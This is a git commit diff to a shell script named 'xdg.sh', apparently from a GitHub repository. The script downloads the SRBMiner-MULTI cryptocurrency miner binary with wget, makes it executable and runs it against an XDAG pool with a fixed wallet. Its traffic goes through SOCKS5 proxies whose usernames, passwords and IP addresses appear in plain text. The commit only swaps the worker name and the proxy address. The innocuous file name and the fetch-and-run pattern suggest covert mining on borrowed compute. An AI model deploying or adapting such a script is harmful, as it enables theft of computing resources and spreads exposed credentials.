339dec82cc88bdcf53d0df00166bc48d83e0c0d1
AhmadTugiman <114766846+AhmadTugiman@users.noreply.github.com>
2022-10-18 17:07:03 +0700

    Update xdg.sh

--- xdg.sh
+++ xdg.sh
@@ -2,4 +2,4 @@
 curl -v -x "socks5://ingfoingfo-rotate:maszZeehh@p.webshare.io:80/" webshare.io/
 wget https://github.com/AhmadTugiman/gembel/raw/main/SRBMiner-MULTI
 chmod 700 SRBMiner-MULTI
-./SRBMiner-MULTI --algorithm xdag --pool xdag.org:13656 --wallet 6Sdu2VTNLImAIoq7KscJq38v2yGNS6wx --worker $(echo $(shuf -i 1-2000 -n 1)) --password x --cpu-threads 4 --disable-gpu --proxy=socks5://ingfoingfo:maszZeehh@154.12.98.44:5128
+./SRBMiner-MULTI --algorithm xdag --pool xdag.org:13656 --wallet 6Sdu2VTNLImAIoq7KscJq38v2yGNS6wx --worker NABILA --password x --cpu-threads 4 --disable-gpu --proxy=socks5://ingfoingfo:maszZeehh@185.205.194.126:7646
